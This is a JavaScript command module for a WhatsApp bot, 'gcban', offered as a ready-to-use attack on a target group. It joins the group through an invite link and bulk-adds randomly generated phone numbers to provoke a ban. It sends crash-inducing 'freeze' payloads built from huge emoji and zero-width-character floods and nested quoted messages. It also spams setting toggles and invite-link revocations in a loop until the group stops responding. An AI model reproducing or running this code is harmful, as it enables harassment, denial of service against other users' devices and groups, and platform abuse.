// 🤖 COMMAND : GC BANNED
// 💻 FEATURE : 100% GROUPS BAN OR FUCKED
// 🧑‍💻 DEVELOPER : QadeerXTech
// 🔗 CHANNEL : https://whatsapp.com/channel/0029VbAkAEhCRs1g8MmyEJ2K
// ESM Version
// ===============================

import { fileURLToPath } from 'url';
import { cmd } from '../command.js';

const __filename = fileURLToPath(import.meta.url);

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ─── Country pools ────────────────────────────────────────────────────────────
const POOLS = [
    { p: "62",  min: 800000000,  max: 899999999  },
    { p: "1",   min: 2000000000, max: 9999999999 },
    { p: "91",  min: 7000000000, max: 9999999999 },
    { p: "55",  min: 1100000000, max: 9999999999 },
    { p: "234", min: 7000000000, max: 9999999999 },
    { p: "92",  min: 3000000000, max: 3999999999 },
    { p: "44",  min: 7000000000, max: 7999999999 },
    { p: "20",  min: 1000000000, max: 1299999999 },
    { p: "49",  min: 1500000000, max: 1799999999 },
    { p: "33",  min: 600000000,  max: 799999999  },
    { p: "7",   min: 9000000000, max: 9999999999 },
    { p: "86",  min: 1300000000, max: 1999999999 },
    { p: "81",  min: 7000000000, max: 9999999999 },
    { p: "82",  min: 1000000000, max: 1099999999 },
    { p: "966", min: 500000000,  max: 599999999  },
];

function fakeJid() {
    const c = POOLS[Math.floor(Math.random() * POOLS.length)];
    const n = Math.floor(c.min + Math.random() * (c.max - c.min + 1));
    return `${c.p}${n}@s.whatsapp.net`;
}

// ─── Normalize JID (strips :XX device suffix) ─────────────────────────────────
function normalizeJid(jid = "") {
    return jid.replace(/:\d+@/, "@").trim().toLowerCase();
}

// ─── Owner check ──────────────────────────────────────────────────────────────
function checkOwner(conn, m) {
    const sender = normalizeJid(m.sender || "");

    // 1. bot's own number is always owner
    const botJid = normalizeJid(conn.decodeJid?.(conn.user?.id) || conn.user?.id || "");
    if (sender === botJid) return true;

    // 2. check against configured OWNER_NUMBER (supports string or array)
    const raw = conn.authState?.creds?.me?.id
        ?? global.ownerNumber
        ?? process.env.OWNER_NUMBER
        ?? "";

    const ownerList = Array.isArray(raw) ? raw : [raw];
    return ownerList.some(o => {
        const clean = String(o).replace(/[^0-9]/g, "");
        return sender.startsWith(clean) || sender === `${clean}@s.whatsapp.net`;
    });
}

// ─── Resolve invite link → JID ────────────────────────────────────────────────
async function resolveJid(conn, raw) {
    raw = String(raw || "").trim();
    if (raw.endsWith("@g.us")) return raw;
    let code = "";
    if (raw.includes("chat.whatsapp.com/")) {
        code = raw.split("chat.whatsapp.com/")[1]?.split("?")[0] || "";
    } else {
        code = raw.replace(/^https?:\/\//i, "").split("?")[0].trim();
    }
    if (!code) return null;
    try {
        const r = await conn.groupAcceptInvite(code);
        const jid = String(r ?? "").trim();
        return jid.endsWith("@g.us") ? jid : null;
    } catch { return null; }
}

// ─── Check if group is dead ───────────────────────────────────────────────────
async function isDead(conn, jid) {
    try {
        const meta = await conn.groupMetadata(jid);
        return !meta?.participants?.length;
    } catch (e) {
        const msg = String(e?.message || "").toLowerCase();
        const code = e?.output?.statusCode ?? e?.data?.output?.statusCode;
        return (
            code === 401 || code === 403 || code === 404 ||
            msg.includes("forbidden") || msg.includes("not-authorized") ||
            msg.includes("item-not-found") || msg.includes("gone") ||
            msg.includes("not found") || msg.includes("not a participant")
        );
    }
}

// ─── ATTACK 1: Bulk fake-number add spam ──────────────────────────────────────
async function attackAdd(conn, jid, count) {
    const batch = [];
    for (let i = 0; i < count; i++) {
        batch.push(
            conn.groupParticipantsUpdate(jid, [fakeJid()], "add").catch(() => {})
        );
    }
    await Promise.allSettled(batch);
}

// ─── ATTACK 2: Freeze payload (crashes group) ─────────────────────────────────
async function attackFreeze(conn, jid) {
    const payloads = [
        {
            interactiveMessage: {
                body: { text: "💀".repeat(2000) },
                nativeFlowMessage: { buttons: "💀".repeat(5000) },
                contextInfo: { quotedMessage: { stickerPackMessage: {} } },
            }
        },
        {
            extendedTextMessage: {
                text: "​".repeat(65535),
                contextInfo: {
                    quotedMessage: {
                        extendedTextMessage: { text: "💀".repeat(10000) }
                    }
                }
            }
        },
        {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: "💀".repeat(3000) },
                        nativeFlowMessage: { buttons: "💀".repeat(8000) },
                        contextInfo: { quotedMessage: { stickerPackMessage: {} } }
                    }
                }
            }
        }
    ];

    for (const payload of payloads) {
        await conn.relayMessage(jid, payload, {}).catch(() => {});
        await sleep(80);
    }
}

// ─── ATTACK 3: Spam group settings changes ────────────────────────────────────
async function attackSettings(conn, jid) {
    const toggles = [
        () => conn.groupSettingUpdate(jid, "announcement").catch(() => {}),
        () => conn.groupSettingUpdate(jid, "not_announcement").catch(() => {}),
        () => conn.groupSettingUpdate(jid, "locked").catch(() => {}),
        () => conn.groupSettingUpdate(jid, "unlocked").catch(() => {}),
    ];
    for (const t of toggles) { await t(); await sleep(50); }
}

// ─── ATTACK 4: Revoke & regenerate invite link spam ──────────────────────────
async function attackInvite(conn, jid) {
    for (let i = 0; i < 10; i++) {
        await conn.groupRevokeInvite(jid).catch(() => {});
        await sleep(60);
    }
}

// ─── Progress bar ─────────────────────────────────────────────────────────────
function bar(done, total) {
    const pct = Math.round((done / total) * 100);
    const f = Math.round(pct / 10);
    return `${pct}% ${"█".repeat(f)}${"░".repeat(10 - f)} 100%`;
}

// ─── CMD ──────────────────────────────────────────────────────────────────────
cmd({
    pattern: "gcban",
    alias: ["gban", "fuckedgc", "qfucked", "gcfucked"],
    react: "💀",
    desc: "ULTRA GC BAN — multi-vector attack (OWNER ONLY)",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { from, reply, args }) => {

    // ─── Owner gate (robust, bypasses broken isOwner from handler) ────────────
    if (!checkOwner(conn, m)) return reply("❌ Owner only.");

    if (!args[0]) return reply(
        `📌 *Usage:* .gcban <group_link or @g.us JID>\n\n` +
        `*Example:*\n.gcban https://chat.whatsapp.com/XXXXXX`
    );

    // ─── Resolve target ───────────────────────────────────────
    const targetJid = await resolveJid(conn, args[0]);
    if (!targetJid) return reply("❌ Invalid group link or JID. Provide a valid invite link.");

    const MAX_ROUNDS     = 50;
    const ADDS_PER_ROUND = 100;
    const ROUND_DELAY    = 150;

    let round     = 0;
    let totalAdds = 0;
    let dead      = false;

    // ─── Init message ─────────────────────────────────────────
    const initMsg = await conn.sendMessage(from, {
        text: `💀 *ULTRA GC BAN INITIATED*\n\n` +
              `🎯 Target: \`${targetJid}\`\n` +
              `⚡ Attack Vectors: ADD-SPAM + FREEZE + SETTINGS + INVITE\n` +
              `🔄 Max Rounds: ${MAX_ROUNDS}\n\n` +
              `⏳ Starting attack...\n\n` +
              `💀 *Powered by Ahmad Hasan*`
    }, { quoted: mek });

    // ─── Main attack loop ─────────────────────────────────────
    while (!dead && round < MAX_ROUNDS) {
        round++;

        await attackAdd(conn, targetJid, ADDS_PER_ROUND);
        totalAdds += ADDS_PER_ROUND;

        await attackFreeze(conn, targetJid);

        if (round % 3 === 0) await attackSettings(conn, targetJid);
        if (round % 5 === 0) await attackInvite(conn, targetJid);

        dead = await isDead(conn, targetJid);

        if (initMsg?.key && round % 2 === 0) {
            await conn.sendMessage(from, {
                text: `💀 *ULTRA GC BAN — ROUND ${round}/${MAX_ROUNDS}*\n\n` +
                      `🎯 Target: \`${targetJid}\`\n` +
                      `🔥 Adds Fired: ${totalAdds}\n` +
                      `⚡ Freeze Payloads: ${round * 3}\n` +
                      `🔄 Settings Toggles: ${Math.floor(round / 3) * 4}\n\n` +
                      `${bar(round, MAX_ROUNDS)}\n\n` +
                      `${dead ? "✅ GROUP IS DEAD" : "⏳ Continuing..."}\n\n` +
                      `💀 *Powered by Ahmad Hasan*`,
                edit: initMsg.key
            }).catch(() => {});
        }

        if (!dead) await sleep(ROUND_DELAY);
    }

    // ─── Final report ─────────────────────────────────────────
    const finalText =
        `${dead ? "✅ GROUP SUCCESSFULLY BANNED" : "⚠️ MAX ROUNDS REACHED — GROUP MAY NEED MORE TIME"}\n\n` +
        `🎯 Target: \`${targetJid}\`\n` +
        `🔄 Rounds Completed: ${round}\n` +
        `🔥 Total Fake Adds: ${totalAdds}\n` +
        `❄️ Freeze Attacks: ${round * 3}\n` +
        `⚙️ Settings Attacks: ${Math.floor(round / 3) * 4}\n` +
        `🔗 Invite Revokes: ${Math.floor(round / 5) * 10}\n\n` +
        `💀 *Powered by Ahmad Hasan*`;

    if (initMsg?.key) {
        await conn.sendMessage(from, { text: finalText, edit: initMsg.key }).catch(() => {});
    } else {
        await reply(finalText);
    }

    await conn.sendMessage(from, {
        react: { text: dead ? '✅' : '💀', key: mek.key }
    });
});
